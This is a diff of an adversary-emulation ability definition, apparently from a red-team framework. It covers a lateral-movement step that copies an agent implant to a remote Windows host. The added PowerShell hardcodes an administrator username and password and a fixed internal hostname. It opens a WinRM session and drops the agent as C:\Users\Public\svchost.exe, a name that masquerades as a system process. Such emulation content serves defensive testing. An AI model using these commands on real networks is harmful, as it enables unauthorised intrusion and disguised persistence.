@@ -1,8 +1,8 @@
 ---
 
 - id: 4908fdc4-74fc-4d7c-8935-26d11ad26a8d
-  name: Copy 54ndc47
-  description: Copy 54ndc47 to remote host
+  name: Copy 54ndc47 (WinRM and SCP)
+  description: Copy 54ndc47 to remote host (powershell 5 or newer only) or SCP
   tactic: lateral-movement
   technique:
     attack_id: T1105
@@ -11,15 +11,16 @@
     windows:
       psh:
         command: |
-          $username = "#{host.user.name}";
-          $password = "#{host.user.password}";
-          $secstr = New-Object -TypeName System.Security.SecureString;
-          $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};
-          $cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;
-          $File = [System.IO.File]::ReadAllBytes("sandcat.exe");
-          $session = New-PSSession -ComputerName #{remote.host.name} -Credential $cred;
-          Copy-Item -Path sandcat.exe -Destination 'C:\Users\Public\' -ToSession $session
-        payload: sandcat.go
+          $job = Start-Job -ScriptBlock {
+            $username = "MOUNTAINPEAK\Administrator";$password = "P@ssw0rd";$secstr = New-Object -TypeName System.Security.SecureString;
+            $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};
+            $cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;
+            $session = New-PSSession -ComputerName "ip-172-16-87-56.ec2.internal" -Credential $cred;
+            Copy-Item -Path "sandcat.go-windows" -Destination "C:\Users\Public\svchost.exe" -ToSession $session;
+            Remove-PSSession -Session $session;
+          };
+          Receive-Job -Job $job -Wait;
+        payload: sandcat.go-windows
     darwin:
       sh:
         command: |
